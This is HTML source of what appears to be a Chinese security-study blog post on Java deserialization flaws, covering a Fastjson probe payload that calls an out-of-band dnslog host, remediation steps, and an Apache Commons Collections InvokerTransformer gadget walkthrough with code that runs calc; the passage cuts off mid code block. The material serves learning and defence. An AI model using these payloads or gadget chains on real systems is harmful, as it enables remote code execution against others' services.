&lt;p&gt;{“x”:{&amp;quot;@type&amp;quot;:“java.net.Inet4Address” , “val”:“&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h4eC5kbnNsb2cuY24=&#34;&gt;xxx.dnslog.cn&lt;/span&gt;”}}&lt;/p&gt;
&lt;p&gt;Burp 插件&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ppbG9uZzMwMzMvZmFzdGpzb25TY2Fu&#34;&gt;https://github.com/zilong3033/fastjsonScan&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;修复&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、升级 JDK&lt;/p&gt;
&lt;p&gt;6u211 / 7u201 / 8u191 /11.0.1&lt;/p&gt;
&lt;p&gt;2、升级 Fastjson 到最新版&lt;/p&gt;
&lt;p&gt;fastjson.parser.safeMode=true&lt;/p&gt;
&lt;p&gt;3、使用安全产品过滤非法内容&lt;/p&gt;
&lt;p&gt;4、更换其它序列化工具&lt;/p&gt;
&lt;p&gt;Jackson/Gson&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTU3MTg1&#34;&gt;浅析 FastJSON 反序列化漏洞（1.2.24——1.2.68） - 腾讯云开发者社区 - 腾讯云 (tencent.com)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;apache-common-collections-反序列化漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#apache-common-collections-反序列化漏洞&#34;&gt;#&lt;/a&gt; Apache Common Collections 反序列化漏洞&lt;/h3&gt;
&lt;p&gt;复现环境：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;jdk 1.7.0_80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;IDEA Project Structrure、Settings——Javacompile等设置成java7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Commons Collections ≤ 3.2.1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Common Collections 提供了很多新的数据结构：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Bag interface for collections that have a number of copies of each object&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BidiMap interface for maps that can be looked up from value to key as well and key to value&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MapIterator interface to provide simple and quick iteration over maps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Transforming decorators that alter each object as it is added to the collection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Composite collections that make multiple collections look like one&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ordered maps and sets that retain the order elements are added in, includingan LRU based map&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Reference map that allows keys and/or values to be garbage collected underclose control&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Many comparator implementations&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Many iterator implementations&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Adapter classes from array and enumerations to collections&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Utilities to test or create typical set-theory properties of collections such asunion, intersection, and closure&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;反射：&lt;/p&gt;
&lt;p&gt;class 文件以 CA FE BA BE 开头&lt;/p&gt;
&lt;p&gt;在程序运行的时候动态创建一个类的实例，调用实例的方法和访问它的属性&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public static void test2()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            //初始化Runtime类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Class clazz = Class.forName(&amp;quot;java.lang.Runtime&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            // 调用Runtime类中的getRuntime方法得到Runtime类的对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Object rt = clazz.getMethod(&amp;quot;getRuntime&amp;quot;).invoke(clazz);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            //再次使用invoke调用Runtime类中的方法时，传递我们获得的对象，这样就可以调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            clazz.getMethod(&amp;quot;exec&amp;quot;,String.class).invoke(rt,&amp;quot;calc&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;catch (Exception e)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;详细的上面有详细解释，具体可以看上面&lt;/p&gt;
&lt;h4 id=&#34;利用链1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用链1&#34;&gt;#&lt;/a&gt; 利用链 1&lt;/h4&gt;
&lt;p&gt;关键类：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;InvokeTransformer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;利用Java反射机制来创建类实例&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ChainedTransformer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform()方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ConstantTransformer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;transform()返回构造函数的对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;TransformedMap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120171605414.png&#34; alt=&#34;image-20221120171605414&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.InvokerTransformer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个 transform (Object input) 中使用 Java 反射机制调用了 input 对象的一个方法，而该方法名是实例化 InvokerTransformer 类时传入的 iMethodName 成员变量：&lt;/p&gt;
&lt;p&gt;功能函数 transform 需要传入一个对象，然后执行构造函数中给定的方法&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt;, Serializable &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; -&lt;span class=&#34;number&#34;&gt;8653385846894047688L&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String iMethodName;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Class[] iParamTypes;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Object[] iArgs;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object input)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (input == &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;cls&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; input.getClass();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;type&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;method&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; cls.getMethod(&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iMethodName, &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iParamTypes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; method.invoke(input, &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iArgs);    &lt;span class=&#34;comment&#34;&gt;//以上三句获取对象，得到方法，执行方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (NoSuchMethodException var5) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FunctorException&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;InvokerTransformer: The method &amp;#x27;&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iMethodName + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; on &amp;#x27;&amp;quot;&lt;/span&gt; + input.getClass() + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; does not exist&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (IllegalAccessException var6) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FunctorException&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;InvokerTransformer: The method &amp;#x27;&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iMethodName + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; on &amp;#x27;&amp;quot;&lt;/span&gt; + input.getClass() + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; cannot be accessed&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (InvocationTargetException var7) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FunctorException&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;InvokerTransformer: The method &amp;#x27;&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iMethodName + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; on &amp;#x27;&amp;quot;&lt;/span&gt; + input.getClass() + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; threw an exception&amp;quot;&lt;/span&gt;, var7);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试代码&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.InvokerTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * InvokerTransformer反射触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;TransTest1&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 创建实例 传入构造方法参数 （函数名 参数类型 参数值）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;InvokerTransformer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;invokerTransformer&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;String.class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;String&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;Calc.exe&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;// 通过反射机制依次获得Runtime类 getRuntime构造方法 最后生成Runtime实例&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;// Object input = Class.forName(&amp;quot;java.lang.Runtime&amp;quot;).getMethod(&amp;quot;getRuntime&amp;quot;).invoke(Class.forName(&amp;quot;java.lang.Runtime&amp;quot;));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Runtime.getRuntime();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;comment&#34;&gt;// 执行transform函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            invokerTransformer.transform(input);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (Exception e)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;2.ChainedTransformer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个类创建实例时，需要传入一个 Transformer 数组，该类的功能就是遍历执行 Transformer 数组的 transform 函数，并且将上一次的 transform 函数的执行结果作为下一次 transform 的输入&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span 